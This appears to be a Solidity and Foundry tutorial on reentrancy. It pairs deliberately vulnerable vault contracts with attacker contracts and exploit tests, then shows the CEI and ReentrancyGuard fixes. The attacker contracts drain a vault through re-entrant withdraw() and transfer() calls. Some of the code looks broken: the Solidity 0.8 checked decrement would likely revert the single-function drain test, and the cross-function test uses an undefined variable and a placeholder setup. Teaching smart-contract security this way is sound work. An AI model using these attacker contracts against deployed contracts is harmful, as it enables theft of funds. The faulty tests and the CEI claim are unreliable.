# Reentrancy Vulnerability Testing

Foundry-based tests demonstrating reentrancy attacks and their mitigations. Each example includes the vulnerable contract, an attacker contract, a proof-of-exploit test, and the fix.

## Vulnerable Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract VulnerableVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient");

        // External call BEFORE state update -- classic reentrancy
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "Transfer failed");

        balances[msg.sender] -= amount;
    }

    receive() external payable {}
}
```

## Attacker Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {VulnerableVault} from "./VulnerableVault.sol";

contract ReentrancyAttacker {
    VulnerableVault public vault;
    uint256 public attackAmount;

    constructor(address _vault) {
        vault = VulnerableVault(payable(_vault));
    }

    function attack() external payable {
        attackAmount = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }

    // Re-enters withdraw() on every ETH receive until vault is drained
    receive() external payable {
        if (address(vault).balance >= attackAmount) {
            vault.withdraw(attackAmount);
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

## Foundry Test: Proving the Reentrancy

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {VulnerableVault} from "../src/VulnerableVault.sol";
import {ReentrancyAttacker} from "../src/ReentrancyAttacker.sol";

contract ReentrancyTest is Test {
    VulnerableVault vault;
    ReentrancyAttacker attacker;
    address victim = makeAddr("victim");

    function setUp() public {
        vault = new VulnerableVault();
        attacker = new ReentrancyAttacker(address(vault));

        // Victim deposits 10 ETH
        deal(victim, 10 ether);
        vm.prank(victim);
        vault.deposit{value: 10 ether}();
    }

    function test_reentrancyDrainsVault() public {
        uint256 vaultBalanceBefore = address(vault).balance;
        assertEq(vaultBalanceBefore, 10 ether);

        // Attacker deposits 1 ETH, drains entire vault
        deal(address(this), 1 ether);
        attacker.attack{value: 1 ether}();

        // Vault drained: attacker has 11 ETH (1 own + 10 stolen)
        assertEq(address(vault).balance, 0);
        assertEq(attacker.getBalance(), 11 ether);
    }
}
```

## Fix 1: CEI Pattern

Reorder operations so state updates happen before external calls.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract CEIVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        // Checks
        require(balances[msg.sender] >= amount, "Insufficient");
        // Effects -- state updated BEFORE external call
        balances[msg.sender] -= amount;
        // Interactions
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "Transfer failed");
    }

    receive() external payable {}
}
```

## Fix 2: ReentrancyGuard

Belt-and-suspenders defense that catches cross-function reentrancy.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract GuardedVault is ReentrancyGuard {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external nonReentrant {
        require(balances[msg.sender] >= amount, "Insufficient");
        balances[msg.sender] -= amount;
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "Transfer failed");
    }

    receive() external payable {}
}
```

## Cross-Function Reentrancy

CEI alone does not prevent cross-function reentrancy, where the attacker re-enters a *different* function that reads the not-yet-updated state.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract CrossFunctionVulnerable {
    mapping(address => uint256) public balances;

    function transfer(address to, uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient");
        balances[msg.sender] -= amount;
        balances[to] += amount;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient");

        // Attacker re-enters transfer() here, moving balance to accomplice
        // before this line decrements it
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "Transfer failed");

        balances[msg.sender] -= amount;
    }

    receive() external payable {}
}
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {CrossFunctionVulnerable} from "./CrossFunctionVulnerable.sol";

contract CrossFunctionAttacker {
    CrossFunctionVulnerable public vault;
    address public accomplice;
    uint256 public attackAmount;

    constructor(address _vault, address _accomplice) {
        vault = CrossFunctionVulnerable(payable(_vault));
        accomplice = _accomplice;
    }

    function attack() external payable {
        attackAmount = msg.value;
        vault.withdraw(attackAmount);
    }

    // On re-entry, transfer balance to accomplice before withdraw decrements
    receive() external payable {
        vault.transfer(accomplice, attackAmount);
    }
}
```

Test proving cross-function reentrancy:

```solidity
function test_crossFunctionReentrancy() public {
    address accomplice = makeAddr("accomplice");
    CrossFunctionAttacker xAttacker = new CrossFunctionAttacker(
        address(xVault), accomplice
    );

    // Setup: attacker has 5 ETH deposited
    deal(address(xAttacker), 5 ether);
    // ... deposit logic

    // After attack: attacker keeps ETH withdrawal AND accomplice has the balance
    xAttacker.attack();

    // Accomplice can now withdraw the transferred balance
    assertGt(xVault.balances(accomplice), 0);
}
```

## Key Takeaways

- Always apply CEI (Checks-Effects-Interactions) as baseline defense
- Always add `nonReentrant` on functions that make external calls
- CEI does not prevent cross-function reentrancy -- `ReentrancyGuard` does
- Read-only reentrancy targets `view` functions that external protocols call during callbacks; apply `nonReentrant` to those too
- Test with an attacker contract that has a malicious `receive()` or `fallback()`
